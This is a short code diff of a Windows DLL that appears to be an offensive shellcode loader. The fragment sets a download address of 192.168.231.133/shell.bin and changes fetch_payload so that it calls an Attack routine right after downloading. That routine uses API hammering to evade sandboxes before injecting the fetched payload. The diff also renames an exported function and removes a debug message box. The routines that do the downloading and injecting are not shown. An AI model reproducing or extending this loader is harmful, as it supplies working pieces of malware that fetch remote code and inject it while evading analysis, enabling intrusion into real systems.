@@ -6,7 +6,7 @@ PWSTR url = L"192.168.231.133";
 PWSTR endpoint = L"/shell.bin";
 SIZE_T sSize = (SIZE_T) NULL;
 
-extern __declspec(dllexport) int dw() {
+extern __declspec(dllexport) int Apex() {
     while (TRUE) {}
 }
 
@@ -49,9 +49,6 @@ extern __declspec(dllexport) int Attack()
 
     ApiHammering(1000);
 
-    //__debugbreak();
-    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
-    //__debugbreak();
     if (!Inject(&pInjectedPayload))
     {
         return -1;
@@ -67,7 +64,8 @@ extern __declspec(dllexport) int Attack()
 EXTERN_C DWORD fetch_payload()
 {
     sSize = Download(&pPayload, url, endpoint, FALSE);
-    return sSize;
+    Attack();
+    return TRUE;
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
